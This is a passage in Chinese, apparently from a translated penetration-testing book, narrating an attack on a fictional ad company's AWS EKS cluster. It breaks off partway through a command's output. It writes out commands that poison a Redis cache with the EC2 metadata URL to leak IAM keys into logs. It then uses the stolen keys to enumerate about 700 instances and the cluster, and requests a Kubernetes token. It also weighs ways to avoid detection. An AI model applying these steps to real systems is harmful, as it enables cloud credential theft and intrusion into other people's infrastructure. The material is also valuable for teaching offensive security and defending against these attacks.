
`shell> curl "10.20.86.24:9200/log/_search?pretty&size=10&q=message: 886371554408"`

`"level": "Critical"`

`"message": "...\"InstanceProfileArn\" : 

\"arn:aws:iam::886371554408:instance-profile/eks-workers-prod-common-NodeInstanceProfile-BZUD6DGQKFGC\"...org.xml.sax.SAXParseException...Not valid XML file"`

```
```

触发查询的 pod 正在使用 IAM 角色 `eks-workers-prod-common-NodeInstanceProfile-BZUD6DGQKFGC` 运行。现在我们只需再次污染 Redis 缓存，但这次在 URL 中附加角色名称以获取其临时访问密钥：

```
shell> redis -h 10.59.12.47 set vast_c88b4ab3d_19devear\
http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-workers-prod-common-NodeInstanceRole-BZUD6DGQKFGC
OK
```

几分钟后，我们在日志索引中获得了梦寐以求的奖品，即具有 EKS 节点权限的有效 AWS 访问密钥：

```
shell> curl "10.20.86.24:9200/log/_search?pretty&size=10&q=message: AccessKeyId"
"level": "Critical"
"message": "...\"AccessKeyId\" : \"ASIA4A4ZRK6WS3R64ZPDI\", \"SecretAccessKey\" : \"\n\"+EplZs...org.xml.sax.SAXParseException...Not valid XML file"
```

根据 AWS 文档，附加到 Kubernetes 节点的默认角色将对 EC2 具有基本权限以发现其环境：`describe-instances`、`describe-security-groups`、`describe-volumes`、`describe-subnets` 等。让我们试用这些新凭据并列出 `eu-west-1` 区域（爱尔兰）中的所有实例：

```
root@Point1:~# vi ~/.aws/credentials
[node]
aws_access_key_id = ASIA4A4ZRK6WS3R64ZPDI
aws_secret_access_key = +EplZsWmW/5r/+B/+J5PrsmBZaNXyKKJ
aws_session_token = AgoJb3JpZ2luX2...
root@Point1:~# aws ec2 describe-instances \
--region=eu-west-1 \
--profile node
--snip--
```

```
"InstanceId": "i-08072939411515dac",
"InstanceType": "c5.4xlarge",
"KeyName": "kube-node-key",
"LaunchTime": "2019-09-18T19:47:31.000Z",
"PrivateDnsName": "ip-192-168-12-33.eu-west-1.compute.internal",
"PrivateIpAddress": "192.168.12.33",
"PublicIpAddress": "34.245.211.33",
"StateTransitionReason": "",
"SubnetId": "subnet-00580e48",
"Tags": [
{
"Key": "k8s.io/cluster-autoscaler/prod-euw1",
"Value": "true"
}],
--snip--
```

事情看起来很不错。我们获得了大约 700 台 EC2 机器的完整描述，包括私有和公有 IP 地址、防火墙规则、机器类型等。这已经是很多机器了，但对于规模如 MXR Ads 的公司来说，这个数字相对较小。有些不对劲。

全部机器都带有特殊标签 `k8s.io/cluster-autoscaler/prod-euw1`。这是 `autoscaler` 工具 (`https://github.com/kubernetes/autoscaler/`) 常用的一个标签，用来标记可丢弃的节点，当 Pod 活动量较低时可以将其杀掉。MXR Ads 很可能利用了这个标签来限制分配给 Kubernetes 节点的默认权限的范围。确实很聪明。

讽刺的是，该标签泄露了 Kubernetes 集群名称（`prod-euw1`），而这是在调用 `describeCluster` API 时的必填参数。那就调用 `describeCluster` 吧：

```
root@Point1:~/# export AWS_REGION=eu-west-1
root@Point1:~/# aws eks describe-cluster --name prod-euw1 --profile node
{ "cluster": {
① "endpoint": "https://BB061F0457C63.y14.eu-west-1.eks.amazonaws.com",
② "roleArn": "arn:aws:iam::1886477354405:role/eks-prod-role",
"vpcId": "vpc-05c5909e230201771",
"endpointPublicAccess": false,
"endpointPrivateAccess": true,
--snip--
```

API 服务器就是那个长 URL，方便地命名为 `endpoint` ①。在某些罕见的配置中，它可能暴露在互联网上，使得查询/更改集群的期望状态变得更加方便。

我们获得的角色 ② 可以做得远不止简单地探索 Kubernetes 资源。在默认设置下，该角色有权将任何安全组附加到集群中的任何其他节点。现在我们获得了此角色，只需找到一个向互联网暴露所有端口的现有安全组——总有一个——并将其分配给托管我们当前 shell 的机器。

不过别急。虽然诱人将我们手工制作的基于 S3 的反向 shell 升级为全双工通信通道，但 MXR Ads 很可能通过 `Terraform` 声明了他们的 Kube 集群，即应该理想运行多少台机器、其网络配置应是什么样、以及为每台机器分配哪些安全组。如果我们更改这些参数，该更改将在下一次 `terraform plan` 命令中被标记。一个允许所有入站流量进入随机节点的安全组只会引发我们宁愿避免的问题。

我们继续尝试使用附加到 Kube 节点的角色，但它很快就达到了极限。它被限制得如此严重，以至于失去了所有兴趣。我们只能描述集群组件的一般信息。我们无法访问机器的用户数据，也几乎无法做出任何更改而不惊动警报。

仔细想想，为什么我们只把这个节点当作 AWS 资源来看待？它首先是一个 Kubernetes 资源。而且是一个特权的资源。在 AWS 环境中，这个节点可能拥有可笑的权限，但在 Kubernetes 世界中，它是至高无上的神，因为它对领域内的 Pod 拥有生杀大权。

如前所述，每个节点都运行着一个名为 `kubelet` 的进程，它轮询 API 服务器以生成或终止新的 Pod。运行容器意味着挂载卷、注入密钥...它到底是如何获得这种级别的访问权限的？

答案：通过节点的实例配置文件——也就是我们整个过程中一直在使用的角色。

当你在 EKS 上设置 Kubernetes 集群时，在启动节点之前要应用的第一个配置之一就是将节点 IAM 角色名称添加到 `system:nodes` 组。该组绑定到 Kubernetes 角色 `system:node`，该角色对各种 Kube 对象具有读取权限：服务、节点、Pod、持久卷以及另外 18 种资源！

我们要继承这些权限所要做的就是让 AWS 将我们的 IAM 访问密钥转换为有效的 Kubernetes 令牌，以便我们可以作为 `system:nodes` 组的合法成员查询 API 服务器。为此我们调用 `get-token` API：

```
root@Point1:~/# aws eks get-token --cluster-name prod-euw1 --profile node
{
  "kind": "ExecCredential",
  "apiVersion": "client.authentication.k8s.io/v1alpha1",
  "status": {
    "expirationTimestamp": "2019-11-14T21:04:23Z",
